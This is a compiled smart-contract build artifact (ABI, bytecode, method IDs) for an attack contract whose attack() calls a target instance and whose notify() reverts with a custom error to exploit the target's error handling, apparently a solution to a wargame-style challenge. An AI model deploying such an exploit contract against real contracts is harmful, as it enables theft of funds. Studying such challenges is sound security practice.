{"abi":[{"type":"constructor","inputs":[{"name":"instanceAddress","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"instance","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"notify","inputs":[{"name":"amount","type":"uint256","internalType":"uint256"}],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b5060405161030c38038061030c833981016040819052602b91604e565b5f80546001600160a01b0319166001600160a01b03929092169190911790556079565b5f60208284031215605d575f5ffd5b81516001600160a01b03811681146072575f5ffd5b9392505050565b610286806100865f395ff3fe608060405234801561000f575f5ffd5b506004361061003f575f3560e01c8063022ec0951461004357806398d078b41461008b5780639e5faafc146100a0575b5f5ffd5b5f546100629073ffffffffffffffffffffffffffffffffffffffff1681565b60405173ffffffffffffffffffffffffffffffffffffffff909116815260200160405180910390f35b61009e61009936600461020d565b6100a8565b005b61009e610100565b80600a146100fd5760405162461bcd60e51b815260206004820152600b60248201527f437573746f6d4572726f7200000000000000000000000000000000000000000060448201526064015b60405180910390fd5b50565b5f805460408051600481526024810182526020810180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff167f2514363800000000000000000000000000000000000000000000000000000000179052905173ffffffffffffffffffffffffffffffffffffffff9092169161017e9190610224565b5f604051808303815f865af19150503d805f81146101b7576040519150601f19603f3d011682016040523d82523d5f602084013e6101bc565b606091505b50509050806100fd5760405162461bcd60e51b815260206004820152600d60248201527f41747461636b206661696c65640000000000000000000000000000000000000060448201526064016100f4565b5f6020828403121561021d575f5ffd5b5035919050565b5f82515f5b818110156102435760208186018101518583015201610229565b505f92019182525091905056fea2646970667358221220fd35cc1c7bbe2cecda24bee0fd0a29185ee97218ea6f5301c0f6898a07b8950c64736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","instance()":"022ec095","notify(uint256)":"98d078b4"},"id":0}